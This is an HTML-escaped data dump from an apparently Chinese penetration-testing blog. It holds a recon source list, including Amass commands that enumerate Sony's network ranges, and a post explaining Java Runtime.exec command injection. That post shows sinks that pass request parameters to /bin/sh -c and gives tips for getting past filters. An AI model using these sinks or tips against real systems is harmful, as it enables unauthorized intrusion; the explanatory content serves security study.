图片反查\n```\n百度识图、googleimage、tineye\n原图查询坐标\n```\n# Github/Gitee等代码托管平台\n```\nhttps://github.com/dxa4481/truffleHog\nhttps://github.com/lijiejie/GitHack\nhttps://github.com/MiSecurity/x-patrol\nhttps://github.com/az0ne/Github_Nuggests\nhttps://github.com/0xbug/Hawkeye\nhttps://github.com/mazen160/GithubCloner 克隆用户的github\nhttps://github.com/michenriksen/gitrob.git\n```\n# 被入侵网址列表\n```\nhttp://zone-h.org/archive\nwooyun镜像查找目标企业曾出现的漏洞\nhttp://wooyun.2xss.cc/\n```\n# Amass 深入的击面映射和资产发现\n```\nhttps://github.com/OWASP/Amass \n  &gt;amass intel -org &#39;Sony Corporation of America&#39;  #fetch ASN &amp; CIDR IP Range of a Company\n  &gt;amass intel -active -asn 3725 -ip   #enumerate subdomains &amp; IP Address from ASN\n  &gt;amass intel -active -asn 3725    #enumerate subdomains only from ASN \n  &gt;amass intel -active -cidr 160.33.96.0/23   #enumerate subdomains from cidr rang\n  &gt;amass intel -asn 3725 -whois -d sony.com   #enumerate subdomains using asn &amp; whois\n  &gt;amass enum -d sony.com -active -cidr 160.33.99.0/24,160.33.96.0/23 -asn 3725   #enumerate subdomains using cidr &amp; asn\n```\n# 威胁情报平台\n```\nVirustotal：https://www.virustotal.com/gui/home/upload\n腾讯哈勃分析系统：https://habo.qq.com/tool/index\n微步在线威胁情报：https://x.threatbook.cn/\n奇安信威胁情报：https://ti.qianxin.com/\n360威胁情报：https://ti.360.net/#/homepage\n安恒威胁情报：https://ti.dbappsecurity.com.cn/\n火线安全平台：https://www.huoxian.cn\nHacking8安全信息流：https://i.hacking8.com/\n零零信安：https://0.zone\n```&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/一些情报源.md&quot;],&quot;digest&quot;:[0,&quot;ed23490867e26891&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;云信息\&quot;&gt;云信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#云信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Aliyun、AWS、GCP、Azure等&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查找可公开访问的实例&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/gwen001/s3-buckets-finder&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/nccgroup/aws-inventory&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/jordanpotti/AWSBucketDump&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;app反编译\&quot;&gt;APP反编译&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#app反编译\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;url、js、osskey、api等信息查找&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;搜集到接口Fuzz常见参数&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;c段b段信息\&quot;&gt;C段/B段信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#c段b段信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Banner、是否存在目标的后台或其他入口/其他业务系统&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;工具\&quot;&gt;工具&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#工具\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;recon-ng,theharvester,maltego,exiftool等&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.spiderfoot.net/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/smicallef/spiderfoot&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;网页缓存\&quot;&gt;网页缓存&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网页缓存\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://www.cachedpages.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://archive.org/web&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;图片反查\&quot;&gt;图片反查&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#图片反查\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;百度识图、googleimage、tineye&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;原图查询坐标&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;githubgitee等代码托管平台\&quot;&gt;Github/Gitee等代码托管平台&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#githubgitee等代码托管平台\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/dxa4481/truffleHog&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/lijiejie/GitHack&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/MiSecurity/x-patrol&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/az0ne/Github_Nuggests&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/0xbug/Hawkeye&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/mazen160/GithubCloner 克隆用户的github&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/michenriksen/gitrob.git&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;被入侵网址列表\&quot;&gt;被入侵网址列表&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#被入侵网址列表\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://zone-h.org/archive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wooyun镜像查找目标企业曾出现的漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://wooyun.2xss.cc/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;amass-深入的击面映射和资产发现\&quot;&gt;Amass 深入的击面映射和资产发现&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#amass-深入的击面映射和资产发现\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/OWASP/Amass &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -org &#39;Sony Corporation of America&#39;  #fetch ASN &amp;#x26; CIDR IP Range of a Company&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -asn 3725 -ip   #enumerate subdomains &amp;#x26; IP Address from ASN&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -asn 3725    #enumerate subdomains only from ASN &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -cidr 160.33.96.0/23   #enumerate subdomains from cidr rang&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -asn 3725 -whois -d sony.com   #enumerate subdomains using asn &amp;#x26; whois&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass enum -d sony.com -active -cidr 160.33.99.0/24,160.33.96.0/23 -asn 3725   #enumerate subdomains using cidr &amp;#x26; asn&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;威胁情报平台\&quot;&gt;威胁情报平台&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#威胁情报平台\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Virustotal：https://www.virustotal.com/gui/home/upload&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;腾讯哈勃分析系统：https://habo.qq.com/tool/index&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;微步在线威胁情报：https://x.threatbook.cn/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;奇安信威胁情报：https://ti.qianxin.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;360威胁情报：https://ti.360.net/#/homepage&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;安恒威胁情报：https://ti.dbappsecurity.com.cn/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;火线安全平台：https://www.huoxian.cn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Hacking8安全信息流：https://i.hacking8.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;零零信安：https://0.zone&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;云信息&quot;],&quot;text&quot;:[0,&quot;云信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;app反编译&quot;],&quot;text&quot;:[0,&quot;APP反编译&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;c段b段信息&quot;],&quot;text&quot;:[0,&quot;C段/B段信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;工具&quot;],&quot;text&quot;:[0,&quot;工具&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;网页缓存&quot;],&quot;text&quot;:[0,&quot;网页缓存&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;图片反查&quot;],&quot;text&quot;:[0,&quot;图片反查&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;githubgitee等代码托管平台&quot;],&quot;text&quot;:[0,&quot;Github/Gitee等代码托管平台&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;被入侵网址列表&quot;],&quot;text&quot;:[0,&quot;被入侵网址列表&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;amass-深入的击面映射和资产发现&quot;],&quot;text&quot;:[0,&quot;Amass 深入的击面映射和资产发现&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;威胁情报平台&quot;],&quot;text&quot;:[0,&quot;威胁情报平台&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;一些情报源&quot;],&quot;date&quot;:[3,&quot;2026-01-18T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/18&quot;]}],&quot;nextPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/java奇怪的命令执行&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;JAVA奇怪的命令执行&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;java&quot;],[0,&quot;漏洞&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 前言\n首先Java下的命令执行大家都知道常见的两种方式：\n* 使用ProcessBuilder\n```\nProcessBuilder pb=new ProcessBuilder(cmd);\npb.start();\n```\n* 使用Runtime\n```\nRuntime.getRuntime().exec(cmd)\n```\n也就是说上面cmd参数可控的情况下，均存在命令执行的问题。但是话题回来，不太清楚大家是否遇到过java命令执行的时候，无论是windows还是linux环境下，带有|,&amp;lt;,&amp;gt;等符号的命令没办法正常执行。所以今天就进入底层看看这两个东西。\n\n# 差别\n先选择跟进\n```\nRuntime.getRuntime().exec(cmd)\n```\n样例代码如下所示：\n```java\nimport java.io.*;\n\npublic class Main {\n    public static void main(String[] arg) throws IOException {\n        String command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;\n        Process proc = Runtime.getRuntime().exec(command);\n        InputStream in = proc.getInputStream();\n        BufferedReader br = new BufferedReader(new InputStreamReader(in, \&quot;UTF8\&quot;));\n        String line = null;\n        while((line=br.readLine())!=null) {\n            System.out.println(line);\n        }\n    }\n}\n```\n跟进 java.lang.Runtime#exec 的构造方法，这里要感谢phith0n师傅提出的疑问，让我补充完整这篇文章，下面话题回来，exec的构造方法有以下几种情况，其实根据传入的变量我们大概可以区分的了，一个是根据String command，也就是直接传入一个字符串。另一个是根据String cmdarray\\[\\]，也就是传入一个数组。\n\n```java\npublic Process exec(String command) throws IOException {        \n    return exec(command, null, null);\n    }\npublic Process exec(String command, String[] envp) throws IOException {        \n    return exec(command, envp, null);\n    }\npublic Process exec(String cmdarray[]) throws IOException {\n        return exec(cmdarray, null, null);\n     }\npublic Process exec(String[] cmdarray, String[] envp) throws IOException {        \n    return exec(cmdarray, envp, null);\n        }\n```\n\n而根据前面代码中，我们传入的命令是如下所示：\n```\nString command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;\n```\n\n所以会进入\n```\nProcess exec(String command)\n```\n这个构造方法进行处理，跟进这个方法，发现最后返回\n```\nexec(command, null, null)\npublic Process exec(String command) throws IOException {        return exec(command, null, null);    }\n```\n继续跟进这个exec方法，看看这个方法的实现。这里代码实例化了StringTokenizer类，并且传入了我们要执行的command命令，简单翻译一下注释：为指定的字符串构造一个字符串标记器。也就是说StringTokenizer这个类会为特殊字符打上tag之类的东西。\n![](img/22.png)\n我们继续往下看，经过StringTokenizer类处理之后会返回一个cmdarray\\[\\]，而这里的处理实际上是根据空格针对命令进行了分割，至于为什么结果要是一个array数组，我们下面会接着说。\n\n![](img/23.png)\n我们发现经过一系列的处理，最后又有一个return exec 的处理。继续跟进这个exec的处理，我们可以看到这里最后实例化ProcessBuilder来处理我们传入的cmdarray。到这里实际上可以清楚了Runtime.getRuntime().exec()的底层实际上也是ProcessBuilder。\n```\npublic Process exec(String\\[\\] cmdarray, String\\[\\] envp, File dir)\n       throws IOException {\n       return new ProcessBuilder(cmdarray)\n          .environment(envp)\n           .directory(dir)\n           .start();\n   }\n```\n\n我们知道ProcessBuilder.start方法是命令执行，那么跟进这个start我们发现，首先prog获取cmdarray[0]也就是我们的/bin/sh，然后判断security是否为null，如果不为null就会校验checkExec。\n\n然后继续往下走，这里调用java.lang.ProcessImpl.start。\n\n进入之后我们就可以看到最后是调用java.lang.UnixProcess这个类来执行命令，而且我们发现执行命令的时候实际上是根据cmdarray[0]来判断用什么命令。而在java.lang.UnixProcess这个类里面是调用forkAndExec来为命令创建环境等操作。我们看到当前断点pid是2653，而这里确实起了一个sh的进程。\n\n这样看可能还不够明显，因为我们知道/bin/sh -c echo 111 &gt; 3.txt在bash命令行下也不会正常执行成功，命令行下需要/bin/sh -c \&quot;echo 111 &gt; 3.txt\&quot;，看这两段代码的命令执行的效果。\n```\nString\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;\n```\n首先先看\n`String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;`\n按照前面的分析，经过StringTokenizer这个类进行拆分之后变成了{\&quot;/bin/sh\&quot;,\&quot;-c\&quot;,\&quot;\&quot;echo\&quot;,\&quot;111\&quot;、\&quot;&gt;\&quot;,\&quot;3.txt\&quot;\&quot;}。\n\n而当前内存开辟一个12473进程，并且确实12473执行sh命令。\n\n但是我们发现，经过StringTokenizer这类拆分之后，命令完全变了一个味道，语义完全变了，并不是我们想要的结果，那我们再看看\n```\nString\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };\n```\n的结果。因为我们传入的是array数组类型，这里直接将命令直接带入了ProcessBuilder进行处理，前面完全没有经过StringTokenizer这个类的拆分。也就是他完整的保存了我想要的语义。\n\n也就是说getRuntime().exec()如果直接传入字符串会经过StringTokenizer的分割，进而破坏其原本想要表达的意思。\n\n下面这段代码是否存在命令执行的问题，要是在PHP下，我会斩钉截铁的说是，但是回到java环境下，我们发现 | 等一些特殊符号没办法使用，而且传入的是字符串，遇到空格会被StringTokenizer进行切割，所以实际上下面这段代码是没办法使用的。\n```\nString str = request.getParameter(\&quot;url\&quot;);\nString cmdstr = \&quot;ping \&quot;+ url;Runtime.getRuntime().exec(cmdstr)\n```\n再来一段代码，能够执行命令，但是很受限，我们知道命令根据cmdarray[0]来确认以什么命令环境启动，这里确实以/bin/sh启动了，但是后面的命令执行的时候存在问题，它仅能执行单条命令，拼接不了相关参数。\n```\nString str = request.getParameter(\&quot;cmd\&quot;);\nString cmdstr = \&quot;/bin/sh -c \&quot;+ cmd;Runtime.getRuntime().exec(cmdstr)\n```\n最后再来一段代码，下面这段代码才会是java下命令执行的完全体。\n```\nString str = request.getParameter(\&quot;cmd\&quot;);\nString\\[\\] cmdstr = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, str };Runtime.getRuntime().exec(cmdstr)\n```\n后面我翻到一篇文章，实际上也是差不多这个情况，实际上也是这个StringTokenizer这个类针对命令进行处理可能会造成非预期的结果。\n\n最后还有一个问题，为什么一定要将命令切割成为数组，原因是因为ProcessBuilder，看看他的构造方法。\n```\npublic ProcessBuilder(String... command) {        \n    this.command = new ArrayList&lt;&gt;(command.length);        \n    for (String arg : command)            \n    this.command.add(arg);\n   }\npublic ProcessBuilder(List&amp;lt;String&amp;gt; command) {\n    if (command == null)\n    throw new NullPointerException();\n    this.command = command;\n\n   }\n```\n实际上它是要求 Array 类型或者 List 类型，如果我们要执行下图中的代码是不行的。\n\n原因在于我们传入的类型不对，我们前面说过命令执行是根据cmdarray[0]，确认命令启动环境，这里自然找不到我们要启动的命令。\n\n所以Java下的命令稍微改造一下代码就好。\n\n还有一种方式就是用编码，linux下可以用bash的base64编码来解决这个特殊字符的问题。\n\n![](img/24.png)\n这里在小提一下如果遇到命令执行过滤了ProcessBuilder和getRuntime，可以考虑一下java.lang.ProcessImpl.start\n\n# 小结\n\n其实java已经尽量规避命令执行的安全问题，JDK沙盒机制会进行checkExec，执行命令的机制就是仅仅检查并执行命令数组中的第一个，而分隔符后面的所有东西都是默认为被执行程序的参数，而分隔符后面的所有东西都是默认为被执行程序的参数，这也是我们前文一直聊的内容。所以getRuntime().exec()通过传入字符串执行命令的时候，应该尽量避免使用空格，用了空格可能会改变这条命令本身想要表达的意思。\n\n所以在java下如果遇到复杂的命令执行，且参数只能如下所示，且只有一个位置可以控制的话，建议使用base64的编码方式，windows下可以使用powershell的base64。\n\njava的反序列化框架利用框架yso，以及一些shiro这类反序列化导致的命令执行实际上很多是用了getRuntime来达到命令执行的目的，且就像我们上面说的，可控位置比较固定，执行复杂命令会出现执行不了。&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/JAVA奇怪的命令执行.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]],&quot;digest&quot;:[0,&quot;d35953b4d44114a7&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;前言\&quot;&gt;前言&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#前言\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;首先Java下的命令执行大家都知道常见的两种方式：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;使用ProcessBuilder&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ProcessBuilder pb=new ProcessBuilder(cmd);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;pb.start();&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;使用Runtime&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Runtime.getRuntime().exec(cmd)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;也就是说上面cmd参数可控的情况下，均存在命令执行的问题。但是话题回来，不太清楚大家是否遇到过java命令执行的时候，无论是windows还是linux环境下，带有|,&amp;#x3C;,&gt;等符号的命令没办法正常执行。所以今天就进入底层看看这两个东西。&lt;/p&gt;\n&lt;h1 id=\&quot;差别\&quot;&gt;差别&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#差别\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;先选择跟进&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Runtime.getRuntime().exec(cmd)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;样例代码如下所示：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;java\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;import&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; java.io.&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;*&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; class&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; Main&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    public&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; static&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; void&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; main&lt;/span&gt;&lt;span 